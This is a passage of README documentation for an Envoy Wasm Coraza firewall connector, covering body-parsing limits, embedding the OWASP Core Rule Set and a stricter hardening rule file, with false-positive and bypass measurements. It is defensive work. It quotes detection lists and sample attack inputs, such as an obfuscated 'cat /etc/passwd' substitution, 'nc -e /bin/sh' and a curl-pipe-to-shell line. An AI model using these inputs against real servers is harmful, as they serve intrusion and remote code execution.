in the default mode, the interruption with rule id 0 and status 503, and does not mark a `DetectionOnly` transaction as
interrupted, as for any would-be interruption: the telemetry above is how the stop is seen there. The
`inspection_reason` is chosen in this order: `finalization_error`, `request_body_not_inspected` (a request body released
unread, or one a processor failed on), the first outcome the stream recorded, such as the `body_partially_inspected` of
a body `ProcessPartial` cut, and last the outcome that ended the stream. A stop in the request phase is reported
`body_memory_budget_stopped`, since it is refused before the cut is recorded; a stop in the response phase after any
earlier reason keeps that reason, and `terminal_outcome=incomplete` with `inspection_complete=false` shows the stop, as
`terminal_outcome=denied` shows a denial there. A parse that the budget stopped leaves the rules 64 KiB, so that the
rule that denies on the body error still answers first, as above. A request that fits is evaluated as without a budget,
with the same matches and scores. What is not charged is what a rule needs for one value while it evaluates it, which is
gone when it is done and bounded by the policy and the largest value, never by the number of values or rules: a
`capture` rule takes up to `G + min(G, 10)` copies of the value (`G` groups in its pattern, the whole match counted, and
the first ten again in the operator's outputs; nine nested groups that each hold the whole value measure 19, CRS
4.30.0's `capture` rules have at most three groups), a `multiMatch` rule one per transformation that changes the value
(4.3 for six), `setvar` and `setenv` at most two, `msg` and `logdata` none. This connector registers no custom body
processor; one an embedder adds is not limited by the budget, but what it publishes is taken from what the rules have
left, with no 64 KiB reserve. Before the budget bounded the rules, they could keep many times the body (a 4 MiB value
that matched CRS grew the VM to 155 MiB at level 1, 224,000 XML values that matched 838 MiB), memory that Wasm linear
memory never gives back, and the check after the phase only compared what the transaction still held with the root, when
the rules had already allocated and freed the rest.

The budget is not all that bounds an XML body: its values count against `SecArgumentsLimit`, and a document with
more stops at the limit as it stops at the budget, keeping the values before it, but with `ARGUMENTS_LIMIT_REACHED`
and `REQBODY_ERROR` set instead of the budget's telemetry. Rule 200002 of `@recommended-conf` answers 400; where no
rule denies, as in detection-only mode, the filter answers 413 as for any dropped argument, in every engine mode but
`Off`. The values after the stop were not inspected, so that refusal is reported as incomplete
(`inspection_reason=incomplete`, `inspection_complete=false`), and the body never reaches the backend; a rule that
denies first is reported as any denial is (`inspection_reason=denied`, `inspection_complete=true`), and the request
is refused as well.

A body processor that fails for another reason, an XML or JSON syntax error or a malformed multipart part, is different:
it sets `REQBODY_ERROR`, and the filter does not refuse the request itself: a rule of the policy has to deny it, on the
error, such as rule 200002 of `@recommended-conf` (400), or on the values the processor retained before it, which a JSON
or multipart body keeps (an XML document is dropped whole, with none). A request that a rule denies in the request body
phase is reported by its denial (`inspection_reason=denied`, `inspection_complete=true`), whatever the parser had read,
as for the stops above; a denial in the response phase, with the request body unread, is reported
`request_body_not_inspected`, as for any body released unread. Where no rule denies, the request passes: in
`SecRuleEngine DetectionOnly`, where rule 200002 cannot interrupt either, and in a policy that selects a processor and
has no rule on `REQBODY_ERROR`, such as one with its own `ctl:requestBodyProcessor=XML` rule and none of the baseline's.
A policy that includes only the CRS selects the JSON processor (never XML) and has no rule on `REQBODY_ERROR`, so a JSON
body error is let through there, reported `request_body_not_inspected`. A malformed multipart part is refused with 413
by the host's ban on uploads where the engine enforces, so that error passes in `DetectionOnly`. A URL-encoded body has
no error but the budget's. What the processor did not read was not inspected, an XML document being dropped whole with
none of its values kept and a JSON or multipart body keeping those it read before the error, so a request that passes is
reported as for a body released unread (`inspection_reason=request_body_not_inspected`, `inspection_complete=false`,
`terminal_outcome` and the status as for any request; see [Request body access](#request-body-access) and [Recommended
baseline](#recommended-baseline-recommended-conf)).

A body that `SecRequestBodyLimitAction ProcessPartial` cut is reported `inspection_reason=body_partially_inspected`,
also when its parse error comes from the cut, as a JSON body's does, since what the processor read before the error
stays inspected. An XML document that the parser refuses is dropped whole, so one that fails in the retained prefix, or
in a CDATA section the cut ends, is reported `request_body_not_inspected` as an uncut one is (`inspection_complete=false`
either way); a cut XML prefix that parses stays `body_partially_inspected`. A rule's denial and the connector's own
refusals answer first, as for any body.

An XML error that quotes the document (an undeclared entity, an invalid name, a declaration's version or encoding)
needs room in the budget for its message. Where the budget has none the parse stops for the budget instead, and the
connector refuses that with 503 as it does any budget stop, in every engine mode, `DetectionOnly` included, so a tight
budget does not turn such a refusal into a pass. The 503 is the connector's answer where no rule denies first: with
`@recommended-conf` enforcing, rule 200002 reads `REQBODY_ERROR`, which the stop sets, and can answer 400 first.

The check after the parse stays the authority on what was retained and answers 503; a response whose rules the budget
stopped is still replaced with 502 when that check fails first. Without a budget, which is the engine's default, the
processors refuse only what Go Coraza refuses, and the XML that the
[crate's behavior changes](../coraza/README.md#behavior-changes) list.

## Embedding the OWASP Core Rule Set

`make build-envoy-wasm-crs` downloads the CRS release pinned in the tracked
`envoy-coraza/crs.pin`, verifies its SHA-256, and builds `envoy_coraza.wasm`
with the tree embedded behind the non-default `embed-crs` feature. The fetched
tree stays in the gitignored `envoy-coraza/crs/` (`make crs-clean` removes it);
`make test-envoy-wasm-crs` fetches it and runs the embedded-CRS tests, and
`make run-envoy-crs` brings up the example Envoy with the CRS loaded and leaves
it running for manual requests. A build
with the feature on fails when the tree is missing, stale, or partial, so plain
`make build-envoy-wasm` is unchanged.

### Embedding a custom CRS tree

The build verifies the tree against the pin by release, tarball digest, and file
count — not per-file contents — so a locally modified tree embeds too:

```sh
make crs-fetch                                  # start from the pinned release
# ...edit or delete files under envoy-coraza/crs/rules/...
make crs-restamp                                # rewrites the marker's file count
cargo build --locked --release --target wasm32-wasip1 -p envoy-coraza \
    --features envoy-coraza/embed-crs
```

The marker keeps the pinned release and digest, so the artifact still reports
which release the custom tree is based on. `make crs-restamp` is only needed
when the edits add or remove files: `crs-fetch` replaces the tree when the
marker or the file count no longer matches, so content-only edits that keep
the count survive it — including the `crs-fetch` prerequisite of
`make build-envoy-wasm-crs`, which then embeds the edited tree. `make
crs-clean` is the way back to the pinned tree. The restamp keeps the release
provenance but not a record of the local edits; treat a custom artifact as
unreviewed content.

The embedded files live in their own `crs/` namespace, so a policy that already
includes `rules/*.conf` cannot pick up the CRS by accident. A wildcard-first
pattern such as `Include **/*.conf` intentionally does match the embedded `crs/`
namespace. The policy includes the recommended baseline first, as the CRS
setup file requires, and then the CRS files by name:

```json
{
  "directives_map": {
    "crs": [
      "Include @recommended-conf",
      "SecRuleEngine On",
      "Include crs/crs-setup.conf",
      "Include crs/rules/*.conf",
      "Include @crs-hardening-conf"
    ]
  },
  "default_directives": "crs"
}
```

The last line loads the built-in [CRS hardening supplement](#crs-hardening-supplement-crs-hardening-conf), which
closes gaps of the CRS at paranoia level 1; leave it out for the CRS alone.

The baseline already sets `SecRequestBodyAccess On` and
`SecRequestBodyLimit 13107200`. Without it, the filter's own defaults still
inspect request bodies (see [Request body access](#request-body-access)), but
no rule refuses a body the engine cannot parse.

The embedded tree differs from upstream CRS in one file:
`crs/rules/REQUEST-905-COMMON-EXCEPTIONS.conf` is a comment-only stub. Upstream
rules 905100 and 905110 are Apache exceptions that only ever remove inspection:
for a loopback `REMOTE_ADDR` and the request line `GET /` (905100) or, with a
`User-Agent` ending in `(internal dummy connection)`, `GET /` or `OPTIONS *`
(905110), they remove every CRS rule from the transaction and turn its audit
record off. Envoy never sends such requests, and
behind a proxy the client can choose `REMOTE_ADDR`. **The embedded CRS no longer
honours rules 905100 and 905110.** A configured `rule_data` entry named
`crs/rules/REQUEST-905-COMMON-EXCEPTIONS.conf` replaces the stub, as for any
embedded file; operators of an older build can configure such an entry, with
only a comment as its content, to get the same result. The build fails when a
CRS release no longer has that file, so an upgrade that renames it is noticed.

A configured `rule_data` entry whose normalized name matches an embedded file
overrides that file. Without the `embed-crs` feature the same directives work,
but the deployment must supply `crs/crs-setup.conf` (the release's
`crs-setup.conf.example`, which the feature-on build maps automatically) and
the complete `crs/rules/*.conf` **and** `crs/rules/*.data` set through the
`rule_data` config key; a partial set either fails to compile (missing `.data`
files) or cannot block (missing the blocking evaluation rules). Such a set
keeps upstream rules 905100 and 905110: neutralise them, with a comment-only
`crs/rules/REQUEST-905-COMMON-EXCEPTIONS.conf` entry as above or with
`SecRuleRemoveById 905100 905110` after the `Include` of the rules (see
[CRS rules 905100 and 905110](../coraza/README.md#crs-rules-905100-and-905110)),
or at least keep `use_remote_address: true`, so that no client chooses a
loopback `REMOTE_ADDR`.

The fetched tree carries the upstream CRS Apache-2.0 `LICENSE`, and a
feature-on build embeds it with the rules as `crs/LICENSE`.

The embedded tree uses about 50 of the 1024 `rule_data` file slots and about
0.9 MiB of the 8 MiB total budget in a feature-on build. The configured
generation logs the embedded CRS version once at configure time.

## CRS hardening supplement (`@crs-hardening-conf`)

Every build embeds the file [`coraza/crs-hardening.conf`](../coraza/crs-hardening.conf) as the built-in `@crs-hardening-conf`
(`coraza::seclang::CRS_HARDENING_CONF`). It is original to this project, stricter than the CRS, and not part of Go Coraza,
of the CRS or of `@recommended-conf`: a policy that includes it blocks requests that the CRS alone passes. Include it
**last**, after the CRS rules:

```json
"Include @recommended-conf", "SecRuleEngine On", "Include crs/crs-setup.conf", "Include crs/rules/*.conf", "Include @crs-hardening-conf"
```

The file retargets rules that already exist and adds `deny` rules, so the CRS must come first. A scoring rule placed
before the CRS is reset by rule 901200 under multiphase evaluation, and one placed after it is never read by 949110 without
it, so the added rules are `deny,status:403`. Included before the CRS, the deny rules still work and the retargeting does
nothing. Like `@recommended-conf`, no wildcard `Include` loads it, and a configured `rule_data` entry named
`@crs-hardening-conf` replaces it. The CRS gaps it closes are the findings X2-02 and X2-03 of the 2026-11 review (the CRS
reads the OS-command, SQL, template, NoSQL, LDAP and remote-file operators over arguments and cookies only, and its Java
gadget list is short); Go Coraza with the CRS has the same gaps.

| Rules | What they do |
| --- | --- |
| H1 (one `SecRuleUpdateTargetById`) | Add every request header to 49 CRS rules, listed by id: the paranoia level 1 request rules tagged `attack-rce`, `attack-sqli`, `attack-injection-generic`, `attack-rfi`, `attack-ssti` and `attack-lfi` that do not already name `REQUEST_HEADERS`, plus LDAP rule 921200, minus 932180; except `Cookie`, `Accept`, `Accept-Encoding` (rule 932260 matches `gzip`), `Accept-Language`, `Host`, `Content-Type`, `Content-Length`, the pseudo-headers `:authority`, `:method`, `:path` and `:scheme` (the connector puts them in `REQUEST_HEADERS`, and `:path` is the whole URI: `/search?q=ruby+on+rails+jobs` would block) and the two headers Envoy writes itself, `x-request-id` and `x-forwarded-proto`. |
| H1 exclusions (nine `SecRuleUpdateTargetById`) | Take headers away from some rules where real clients send what the rule takes for an attack: `Origin`, `Referer` and the page-URL headers with an IP host (931100), an IPv6 `Origin` (932130), the `User-Agent` of PowerShell (932120), Microsoft Office (932370) and Composer (932235, which rule 10932235 below reads again), `TE` and seven copies of `Accept-Encoding`, by name (`Content-Encoding`, `X-Accept-Encoding`, `X-Forwarded-Accept-Encoding`, `grpc-accept-encoding`, `grpc-encoding`, `Fastly-Orig-Accept-Encoding`, `X-Original-Accept-Encoding`; 932260), the `Signature-Input` and `Signature` of RFC 9421 and the OData `Prefer` header (942100), the `sec-ch-ua` and `sec-ch-ua-full-version-list` client hints of Chromium 85 to 93, whose GREASE brand holds a `;` (942100, 942540), an IPv6 client in `Forwarded` (942550), and `Referer` plus ten headers that carry the URL of a page, by name (930120, 932120, 932160, 932235; see [Referer and the page URL](#referer-and-the-page-url)). |
| H2 (one `SecRuleUpdateTargetById`) | The level 1 remote file inclusion rules 931100, 931110 and 931120 also read cookie values. By id, not by tag: the tag `attack-rfi` also covers the level 2 rules 931130 and 931131, which match `scheme://` anywhere, so a OneTrust `OptanonConsent`, a NextAuth or Auth.js `callback-url` or a Shopify `_orig_referrer` cookie would block every request of a site at level 2 and above. |
| 10944130 | `@pm` of nine gadget classes the CRS list lacks (`com.sun.rowset.JdbcRowSetImpl`, `TemplatesImpl`, `groovy.lang.GroovyShell`, `sun.misc.Unsafe`, c3p0, Spring and logback classes), in arguments, names, cookies, headers, the body and XML. |
| 10944210 | Java serialization magic: raw bytes, hex (either case) and base64, standard and URL-safe, at the three alignments; CRS 944210 fixes one base64 character that depends on the next byte and misses every real stream. |
| 10941100, 10941104, 10941101, 10941103, 10930120, 10930121 | `@detectXSS` and a system-file list (`/etc/passwd`, `/etc/shadow`, `/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell`) over base64-decoded and hex values of arguments, cookies and headers. The XSS rules are chains that decode only a value that is entirely base64 (8 to 256 characters, anchored with `\A` and `\z`; a line break counts as a character; `=` padding; white space, or one junk byte and at most 64 characters, after it; standard or URL-safe alphabet) or hex (8 to 512 characters): rule 10941100 reads arguments and headers and decodes with `base64DecodeExt` (it reads `-` and `_`), rule 10941104 reads cookies and decodes with `base64Decode` (a session cookie of random base64 decoded in full is denied about 0.2 percent of the time: see the false positives), and rule 10941103 reads a base64 value that was URL-encoded twice (`%2B`, `%2F`, `%3D` left in an argument; 1 to 511 characters, an escape counts as one). Random file content in a JSON field decodes to something libinjection reads as an HTML tag, more often the longer it is (see the false positives). Rule 10930120 decodes with `base64DecodeExt` as well, so URL-safe base64 with an early `-` or `_` and a junk byte inside the value are read. |
| 10941102 | `@detectXSS` over the raw value of every header the rules above read. CRS rule 941100 reads `User-Agent` and `Referer` only, so `<%= `id` %>`, `<meta http-equiv="Set-Cookie" ...>` or an `<iframe>` in `X-Custom-Data` scored 0 (23 requests of the X2 matrix, which the old hex rule caught only by chance). |
| 10934900, 10934901, 10934902 | GraphQL introspection: `__schema` or `__type` as a word in the `query` argument (also the `query` field of a JSON body or of each operation of a batch) and in an `application/graphql` body. `__typename` passes. Argument names are not read: a JSON key or form field named `__type` is a type hint of Parse Server, ASP.NET AJAX or WCF, not a query. |
| 10932130 | A command substitution that prints nothing, inside a word: ``;c`~`at /e`~`tc/pa`~`sswd``, ``c`:`at``, ``c` `at``, ``c`true`at`` and `c$()at` run `cat /etc/passwd` and pass the CRS at level 1. An empty `$@` or `$*` inside a word is not matched (passwords). |
| 10932235 | CRS rule 932235 (a Unix command without evasion) over the `User-Agent`, in phase 1, except for the strict shape of a Composer `User-Agent` (`Composer/2.8.2 (Linux; 6.8.0-49-generic; PHP 8.3.13; cURL 8.5.0)`: `cURL 8.5.0` reads as the command `curl` with an argument, so H1 takes the `User-Agent` from 932235). It runs a copy of 932235's operator, which a unit test compares with the embedded CRS, and adds the same score; a command appended to the Composer shape or put in one of its fields does not have the shape and is read. It works with and without multiphase evaluation (see [Referer and the page URL](#referer-and-the-page-url)). |
| 10932238 | PL3 and above: a backtick that starts a command (``foo`whoami` ``, ``echo `whoami` ``). CRS 932238 loses these because `t:cmdLine` removes the backtick first. Off below the level the CRS blocks at (`tx.blocking_paranoia_level` 3), since `` `id` `` is ordinary prose; detecting at level 3 and blocking at level 1 does not turn on a `deny`. Off without the CRS, where that variable is unset (a policy without the CRS has no level). |

**Why H1 lists rules by id.** A negated key such as `!REQUEST_HEADERS:Accept` is an exception of every `REQUEST_HEADERS`
target of the rule, its own as well. A tag-based update would take `Accept`, `Accept-Encoding`, `Accept-Language`, `Host`,
`Content-Type` and `Content-Length` away from the rules that already scan every header (930100 and 930110 path traversal, 932170
Shellshock, 944100 to 944150 Java and Log4Shell), and a Log4Shell, Shellshock or `../` payload in `Accept-Language` would pass.
Those rules are not in the list. A tag would also take the 27 response rules 955xxx, and every rule of paranoia level 2 and
above, into the update; at level 2 to 4 those rules would block every Chromium browser (`sec-ch-ua`), Googlebot and Bingbot,
`python-requests` and the AWS SDK. The retargeting covers the level 1 rules only; a rule of a higher level keeps the targets it has. A test compares the
list with the CRS embedded in the build (the `embed-crs` unit test `the_retargeted_rule_ids_are_the_level_1_rules_that_do_not_read_every_header`),
so a CRS update that adds or changes a rule fails it until the list is regenerated. The test also checks that no listed rule reads
an excluded header natively (`REQUEST_HEADERS:<name>`), because a negated key would
remove it, and that no exclusion is a regular expression. **The id list holds for the pinned
CRS only** (`crs.pin`): a policy that supplies another CRS version through `rule_data` needs a list regenerated for that version,
and nothing checks it there (an id that version lacks is ignored without an error, and a rule it adds is not retargeted).

**Tuning order.** Put a `SecRuleUpdateTargetById <id> "!REQUEST_HEADERS:<name>"` (or `...ByTag`) that excludes a header **after**
`Include @crs-hardening-conf`. One before it does not reach the header target H1 adds later, which carries only its own
exceptions: the rule reads that header again, and a value that the tuning meant to let through blocks. The CRS's own
`RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf` is loaded by `Include crs/rules/*.conf`, before the supplement, so it does
not work for these headers either. There is no ordering inside the file that fixes this: it cannot copy a tuning it has
not read. These work whatever the position of the supplement: a runtime `ctl:ruleRemoveTargetById=<id>;REQUEST_HEADERS:<name>` or
`ctl:ruleRemoveTargetByTag=<tag>;REQUEST_HEADERS:<name>` in a rule of an exclusion file loaded before the CRS rules (a `ctl` acts on
the rules evaluated after it, so one placed after the CRS is too late under multiphase evaluation), `ctl:ruleRemoveByTag=crs-hardening`
for a path, and `ctl:ruleEngine=Off`.

### Referer and the page URL

Rules 930120, 932120, 932160 and 932235 read a URL as free text: `/search?q=ruby+on+rails+jobs`
(932235), `/docs/powershell/getting-started` (932120), `/docs/windows/system32` (930120) and `/bin/view` (932160) all match.
The file excludes `:path` for that reason, but a browser sends the page URL back as `Referer` (the full URL) with every image,
script, stylesheet, XHR call and link click of the page, and other software sends it in headers of its own: htmx as
`HX-Current-URL` with every request, oauth2-proxy and nginx `auth_request` as `X-Auth-Request-Redirect` and `X-Original-URI`,
IIS ARR as `X-Rewrite-URL`, Azure App Service as `X-WAWS-Unencoded-URL`, and proxies as `X-Original-URL`, `X-Forwarded-Uri`,
`X-Forwarded-Path`, `X-Envoy-Original-Path` and Next.js `Next-Url`. Without an exclusion the page loads and every request that
follows it blocks: 25 of the 366 pages of the review's corpus (6.8 percent, searches for `python`, `ruby`, `ifconfig`, `systemctl`
or `crontab`, and the paths above) at level 1 for each of `Referer`, `HX-Current-URL`, `X-Original-URI`, `X-Auth-Request-Redirect`, `X-Rewrite-URL` and
`X-WAWS-Unencoded-URL` (for `Referer` also 9 at levels 2 and 3, and 1 at level 4). The file excludes `Referer` and **these ten
headers, by name** from those four rules: `HX-Current-URL`, `X-Original-URL`, `X-Original-URI`, `X-Forwarded-Uri`,
`X-Forwarded-Path`, `X-Envoy-Original-Path`, `X-Auth-Request-Redirect`, `X-Rewrite-URL`, `X-WAWS-Unencoded-URL` and `Next-Url`. 931100
(a URL with an IP address as host, such as an intranet page in `HX-Current-URL`) skips the same names. The gate holds the 25 pages in
`Referer` and in `HX-Current-URL`, three of them in each of the other headers, and four paths in `X-Forwarded-Path` and `Next-Url`
(79 requests); the 3,073 follow-ups of the review's page corpus (439 pages in seven headers) add no block at levels 1 to 4.

**Why a list and not a pattern.** A rule that skipped every header whose name ends in `url`, `uri`, `path` or `redirect` would close the
class of page-URL headers a framework invents next, but a client chooses the names of its headers, and a backend feeds
`X-File-Path`, `X-Upload-Path`, `X-Template-Path`, `X-Image-Url`, `X-Webhook-Url`, `X-Callback-Uri` or `X-Return-Redirect` to a file system or
a fetcher. Those are the headers whose payloads 930120 (system files), 932160 (shell paths), 932120 and 932235 (commands) and 931100
(internal URLs) exist to read. Measured with the pattern at level 1: 9 of 15 sink payloads (`/etc/passwd`, `;cat /etc/passwd`, a Windows
SAM path, `nc -e /bin/sh`, the cloud metadata URL, `127.0.0.1:2375`, ...) passed in each of those names, against 15 of 15 in `X-Custom-Data`;
with the list, 15 of 15 block in every name (the CRS alone passes all 15). The gate holds ten of them (`sink-header`).

**The price:** a command in `Referer` or in one of the ten listed headers is read by the other retargeted rules and by the file's own deny
rules, not by those four. In the X2 matrix at level 1 the bypass of the `Referer` transport is 71.7 percent, against 62.1 with the four
rules reading it and 91.6 with the CRS alone; the whole matrix moves by 0.4 points. A header that merely holds a URL (`Content-Location`,
`Link`) is read. **A page-URL header that is not in the list is read too**, and the follow-ups of a page that the CRS alone passes block
when it holds `ruby on rails jobs`, `/docs/powershell/getting-started` or `/bin/view` (25 of the 366 pages of the review's corpus, 6.8
percent, per header): nginx `proxy_set_header X-Request-URI $request_uri;` or `X-Forwarded-Url`. One tuning line after the include
clears it (a unit test applies it):

```
SecRuleUpdateTargetById 930120 931100 932120 932160 932235 "!REQUEST_HEADERS:X-Request-URI"
```

**Composer.** The `User-Agent` of Composer (`cURL 8.5.0` reads as the command `curl` with an argument to rule 932235) is excluded
from 932235 for the same kind of reason. Excluding the whole header costs detection: the bypass of the `User-Agent` transport
goes from 60.0 to 65.2 percent (559 requests; the CRS alone: 89.2), because a command in a `User-Agent` (`;curl 203.0.113.9/s|sh`)
passes. Rule 10932235 gives that detection back: it runs the operator of 932235 over the `User-Agent` in phase 1, after the CRS,
and skips a value that has Composer's strict shape, `Composer/<version> (<system>; <kernel>; PHP <version>; cURL <version>|streams
[; Platform-PHP <version>][; CI][; Docker])`. The kernel field allows only letters, digits and `._+~-`, so a command put in a
field or appended to the shape is read (the gate and `crs_regressions.rs` hold both). A phase 1 scoring rule after the CRS works
under multiphase evaluation and without it: phase 1 runs after rule 901200 resets the score and before 949110 reads it, whereas a
`ctl` placed after the CRS is too late, and a phase 2 scoring rule after the CRS is not read without multiphase evaluation. The
cost is about 12,800 instructions per request (0.26 percent) and, once per policy, about 80 million instructions to compile the 10 KB
operator (4 percent of compiling the CRS). The operator is a copy: the unit test
`the_user_agent_copy_of_rule_932235_holds_the_operator_of_the_embedded_crs` fails when a CRS update changes 932235 until the copy
is regenerated. A tuning that removes rule 932235 (`SecRuleRemoveById 932235`, `ctl:ruleRemoveById=932235`) does not remove the
copy: remove 10932235 as well to stop reading the `User-Agent`.

### Measured effect

With the CRS in `envoy-coraza/crs.pin`, the recommended baseline and the connector's multiphase evaluation, over the 935
requests of [`testdata/crs-hardening-gate.json`](testdata/crs-hardening-gate.json) (the unit tests of `policy.rs` assert every
verdict at level 1, with and without the file, and that the file adds no block to the ordinary groups, a sample, at levels 1 to 4).
Requests blocked, without the file / with it:

| Group | Paranoia level 1 | Level 2 | Level 3 | Level 4 |
| --- | --- | --- | --- | --- |
| 84 benign requests | 6 / 6 | 26 / 26 | 33 / 33 | 80 / 80 |
| 8 plain requests | 0 / 0 | 0 / 0 | 1 / 1 | 5 / 5 |
| 22 browser and API header sets | 0 / 0 | 0 / 0 | 2 / 2 | 3 / 3 |
| 35 `User-Agent` values (Safari, Android WebView, curl, crawlers, ...) | 0 / 0 | 0 / 0 | 0 / 0 | 0 / 0 |
| 21 proxy, CDN and browser header sets | 0 / 0 | 0 / 0 | 1 / 1 | 3 / 3 |
| 37 ordinary page, form and API requests | 1 / 1 | 5 / 5 | 9 / 9 | 25 / 25 |
| 20 benign values that look like base64 or hex | 0 / 0 | 0 / 0 | 0 / 0 | 7 / 7 |
| 163 real-world `User-Agent`s (browsers, webviews, PowerShell, Microsoft Office, SDKs, CLI clients, bots) | 0 / 0 | 1 / 1 | 9 / 9 | 9 / 9 |
| 116 real-world header sets (CDNs, proxies, meshes, tracing, webhooks, `Origin` and `Referer` with an IP host, RFC 9421) | 10 / 10 | 13 / 13 | 19 / 19 | 103 / 103 |
| 79 follow-ups of benign pages (the page URL in `Referer`, `HX-Current-URL`, `X-Original-URL`, `X-Original-URI`, `X-Auth-Request-Redirect`, `X-Rewrite-URL`, `X-WAWS-Unencoded-URL`, `X-Forwarded-Uri`, `X-Forwarded-Path`, `X-Envoy-Original-Path`, `Next-Url`) | 0 / 0 | 16 / 16 | 16 / 16 | 62 / 62 |
| 9 JSON keys and form fields named `__type` or `__schema` (Parse Server, ASP.NET AJAX, WCF) | 0 / 0 | 1 / 1 | 4 / 4 | 6 / 6 |
| 33 cookie sets (sessions, analytics, consent, auth; OneTrust, NextAuth, Auth.js and Shopify hold a URL) | 0 / 0 | 5 / 5 | 6 / 6 | 15 / 15 |
| 14 form and JSON logins with generated passwords (`$@`, `$*`) | 0 / 0 | 12 / 12 | 12 / 12 | 14 / 14 |
| 16 `sec-ch-ua` headers of old Chromium (GREASE brand with a `;`) and `User-Agent`s of Composer | 0 / 0 | 10 / 10 | 10 / 10 | 10 / 10 |
| 10 JSON bodies that carry base64 (one line or wrapped at 76 columns) or hex file content, 16 to 256 KiB | 0 / 0 | 7 / 7 | 7 / 7 | 7 / 7 |
| 7 headers that real clients send (`Forwarded` with an IPv6 client, OData `Prefer`, copies of `Accept-Encoding`) | 0 / 0 | 0 / 0 | 0 / 0 | 3 / 3 |
| 16 encoded values (percent-encoded return paths and padded session ids in a cookie, session cookies of Rails, PHP and ASP.NET Core, URL-safe tokens, a signature, a PEM certificate, `<` in prose) | 0 / 0 | 4 / 4 | 5 / 5 | 6 / 6 |
| 17 payloads x 4 places (header, `X-Forwarded-Host`, cookie, query) | 42 / 67 | 44 / 67 | 44 / 67 | 62 / 67 |
| 18 Java gadget and serialization cases (3 in URL-safe base64) | 3 / 18 | 9 / 18 | 9 / 18 | 17 / 18 |
| 9 commands in the `User-Agent` (bare and behind a Composer shape) | 0 / 9 | 7 / 9 | 7 / 9 | 7 / 9 |
| 10 payloads in headers named after a path, a URL or an encoding (`X-File-Path`, `X-Webhook-Url`, `X-Callback-Uri`, ...) | 0 / 10 | 0 / 10 | 0 / 10 | 1 / 10 |
| 4 angle-bracket payloads in headers that CRS rule 941100 does not read | 0 / 4 | 1 / 4 | 2 / 4 | 4 / 4 |
| 39 payloads in headers that CRS rules already read (Log4Shell, Shellshock, `../`, Java, PHP) | 39 / 39 | 39 / 39 | 39 / 39 | 39 / 39 |

The requests carry the headers the connector hands the engine on top of their own (`:authority`, `:path`, `:method`, `:scheme`,
`x-forwarded-proto`, `x-request-id`). On the requests of these ordinary groups the file adds no block at any level. That is a
statement about the gate, a sample of traffic: it is not a guarantee for traffic of another kind, and each review round found a
class the previous gate lacked (see the false positives below). What blocks in those rows is what the CRS itself blocks: its own
6 of the 84 benign requests, one ordinary GraphQL query (rule 932235) and 10 of the 116 real-world header sets (for example
`aws-cli` S3 requests, `git` over HTTP, a `Content-Encoding` or `X-HTTP-Method-Override` header; protocol rules 920420 and 920450). Without
multiphase evaluation every count is the same. The 163 `User-Agent`s and the 116 header sets are a corpus of real clients; without
the H1 exclusions 24 of them block at level 1.

The X2 evasion matrix of the review (843 seeds in 14 attack classes, 11 text layers and many wire layers, 16 transports,
273,618 attack requests; `evidence/X2/gen.py`) at level 1, with the same connector headers, attack requests that reach the
backend, without the file / with it:

| Transport | Bypass without / with | Transport | Bypass without / with |
| --- | --- | --- | --- |
| `X-Custom-Data` header (`xhdr`) | 91.1 % / 59.9 % | query (`query`) | 54.8 % / 52.6 % |
| `User-Agent` (`ua`) | 89.2 % / 60.0 % | form (`form`) | 56.3 % / 54.1 % |
| `Referer` | 91.6 % / 71.7 % | JSON (`json`, `jsonnest`, `jsonarr`) | 52.9 % / 50.9 % |
| cookie value | 70.0 % / 67.2 % | XML, multipart, path | 52.9 to 60.4 % / 51.4 to 59.3 % |

All 273,618 attack requests: 60.5 % bypass without the file, 55.9 % with it (152,831 requests); without the connector's extra
headers 60.7 % and 56.2 % (153,756). What the exclusions and caps cost in this matrix: the page URL headers (`Referer` 62.1 to 71.7 %,
1,024 requests), the GraphQL names (108 requests), the `$@` shape (123) and the shape of the base64 and hex rules (7 base64
payloads in a double-URL-encoded cookie, which are not entirely base64). Rule 10930120 decodes with `base64DecodeExt` and catches 197
requests that `base64Decode` passed (165 are a base64 command used as a query parameter name, read through `:path`; 9 are a cookie,
10 a query or form argument, 6 a JSON field). Rule 10941103 reads arguments only and catches 14 requests (a base64 payload
URL-encoded twice in a query or form argument); over cookies and headers as well it catches none more. Rule 10941104 decodes cookies with
`base64Decode`, and no request of the matrix is lost against `base64DecodeExt` (leaving cookies out of the base64 and hex rules altogether
loses 14). Rule 10941102 (`@detectXSS` over the raw headers) catches 23 requests that the file passed
before, angle-bracket payloads in a header that CRS rule 941100 does not read (`<%= `id` %>`, `<meta http-equiv="Set-Cookie">`, a Java
XMLDecoder document; 17 in `xhdr`, 6 in `referer`), and loses none. Composer's
`User-Agent` costs no detection: rule 10932235 reads the other ones, so the `ua` bypass is 60.0 %, where the exclusion alone gives 65.2 %
(559 requests). The remaining bypasses are the evasion layers that no CRS rule undoes (case folding of the sink, `%u`,
overlong UTF-8, full-width forms, double encoding, NUL bytes), not the transport. By class, bypass without / with: `lfi` 45.0 /
38.4 %, `java` 49.6 / 42.6 %, `rce-unix` 59.9 / 52.0 %, `rce-win` 51.1 / 42.7 %, `ldap` 64.6 / 59.2 %, `graphql` 73.4 / 70.9 %,
`ssti` 64.6 / 60.9 %, `nosql` 65.6 / 61.9 %. The benign requests of the matrix (84) and its 55 protocol cases block exactly as
before (6 and 34).

**The file is calibrated for paranoia level 1.** Its header retargeting covers the level 1 rules, which also run at level 2
to 4, and it does not touch the rules of a higher level, so at levels 2 to 4 the file adds no block to the gate and the
CRS itself decides how many ordinary requests block (the rows above). A level 2 to 4 rule that reads headers natively still
does; the supplement does not add the rest of the headers to it.

### Cost

Measured on the 227 benign requests of the gate that do not carry an attack (84 benign, 8 plain, 22 header sets, 35 `User-Agent`
values, 21 proxy and browser header sets, 37 ordinary requests and 20 encoded-looking values) with the CRS at level 1, multiphase
evaluation, the headers the connector adds to every request (six more values than the request carries), a release build pinned to
one CPU, three paired runs in alternating order, user-space instructions per request: **4,961,723 without the file (range
4,953,354 to 4,961,840), 6,776,939 with it (range 6,776,634 to 6,776,980), +1,815,216 (+36.6 %)**. The previous version of the file
cost 6,809,277 (range 6,808,125 to 6,809,711) in the same session: this version is 32,300 instructions (0.47 %) cheaper, because
rule 10941103 reads arguments only. A second session, which splits the cost by rule (without the file 4,960,338, range 4,959,972 to
4,960,568; with it 6,772,086, range 6,771,838 to 6,772,172; the two sessions differ by 0.07 % on the same file): rule 10941102
(`@detectXSS` over the raw headers) costs about 47,800 instructions (0.71 %: without it 6,724,287, range 6,724,156 to 6,728,086),
